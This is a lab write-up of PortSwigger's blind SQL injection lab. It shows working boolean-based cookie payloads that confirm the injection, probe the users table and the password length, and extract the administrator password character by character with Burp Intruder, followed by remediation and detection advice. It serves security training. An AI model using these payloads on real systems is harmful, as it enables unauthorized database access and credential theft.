# Blind SQL Injection with Conditional Responses

| Field | Detail |
|---|---|
| Lab | Blind SQL injection with conditional responses |
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Blind SQL Injection (boolean-based) |
| CWE | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| Severity | High |
| Date | 15 November 2026 |
| Author | Md Jahidur Rahman Jahid |

## Summary

The shop stores a `TrackingId` cookie and puts it straight into a SQL
query without checking it. The query result is never shown, so the
injection is blind — but the page behaves differently depending on
whether the injected condition is true or false: a true condition
shows "Welcome back!", a false one does not. By asking the database
one true/false question at a time, the administrator password can be
stolen character by character.

## Steps to Reproduce

1. Find the injection point. The `TrackingId` cookie is sent with
   every request and is used in a database query. Intercept a request
   in Burp Suite, send it to Repeater, and edit the cookie. The lab
   TrackingId was `APTHBqIABYCDhoJb`.
2. Prove the injection with a true and a false condition. The signal
   is the "Welcome back!" text in the response — present when the
   condition is true (5,570 bytes), absent when false (5,509 bytes):

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND '1'='1
```

   True — "Welcome back!" appears.

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND '1'='2
```

   False — "Welcome back!" does not appear. The different responses
   prove the input reaches the SQL query.
3. Confirm the `users` table exists:

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users LIMIT 1)='a
```

   True — "Welcome back!" appears, so the table exists.
4. Confirm the `administrator` user exists:

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

   True — "Welcome back!" appears.
5. Find the length of the administrator password by testing lengths
   one at a time:

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

   Each true answer ("Welcome back!" appears) means the password is
   longer than that number. Working up through the lengths, the test
   that confirmed the exact length was:

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```

   True — the password is 20 characters long.
6. Extract the password character by character. First test the idea
   by hand in Repeater — ask whether the character at position 1 is
   'a', then position 2:

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

   Then automate it with Burp Intruder. The same query, with the
   position and the character as the two payload positions
   (cluster bomb):

```http
Cookie: TrackingId=APTHBqIABYCDhoJb' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

   Intruder varies the position (1–20) and the character (a–z, 0–9).
   Every response with length 5,570 and "Welcome back!" present means
   that character is correct at that position. All 20 characters were
   recovered this way, giving the full administrator password.

## Evidence

Step 2, true condition — `AND '1'='1`, "Welcome back!" appears:

![True condition — Welcome back appears](images/sqli-lab2-true.png)

Step 2, false condition — `AND '1'='2`, "Welcome back!" is gone:

![False condition — Welcome back missing](images/sqli-lab2-false.png)

Step 3 — the `users` table exists:

![Users table check — Welcome back appears](images/sqli-lab2-users-table.png)

Step 4 — the `administrator` user exists:

![Administrator check — Welcome back appears](images/sqli-lab2-administrator.png)

Step 5 — the password is 20 characters long:

![Password length check — LENGTH(password)=20 is true](images/sqli-lab2-password-length.png)

Step 6 — Burp Intruder cluster bomb results. Rows with length 5,570
and the "Welcome back!" marker checked are correct characters at
their positions (Payload1 is the position). The recovered characters
are blacked out — they spell out the password, and passwords are
never published:

![Intruder results — correct characters marked by length 5570](images/sqli-lab2-intruder.png)

## Impact

An attacker who can inject SQL through the cookie can:

- Read the full database one true/false question at a time, even
  though the application never shows query results.
- Steal the administrator password and log in as administrator.
- Change or delete data, and in some setups run commands on the
  database server.

Blind injection is slower than UNION-based injection, but the damage
is the same — automation (Burp Intruder) does the repetitive work.

## Remediation

- Use parameterized queries (prepared statements) for all database
  queries — including values that come from cookies, not just from
  form fields and URL parameters.
- Validate the `TrackingId` against an allowlist (for example, only
  letters and numbers, fixed length) and reject anything else.
- Give the database account only the permissions the application
  needs.
- Store passwords hashed (for example bcrypt), never in plain text,
  so a stolen password column does not hand over working passwords.

## Detection (SOC)

- Alert on web requests where a cookie value contains SQL keywords
  (`AND`, `SELECT`, `FROM`, `SUBSTRING`, `LENGTH`) or quote
  characters.
- Alert on a high volume of near-identical requests from one client
  that differ only in a cookie value — the pattern of an automated
  blind extraction (Intruder cluster bomb).
- Alert on responses to the same endpoint that alternate between two
  distinct sizes (here 5,570 vs 5,509 bytes) across many requests.

## References

- PortSwigger — Blind SQL injection: https://portswigger.net/web-security/sql-injection/blind
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
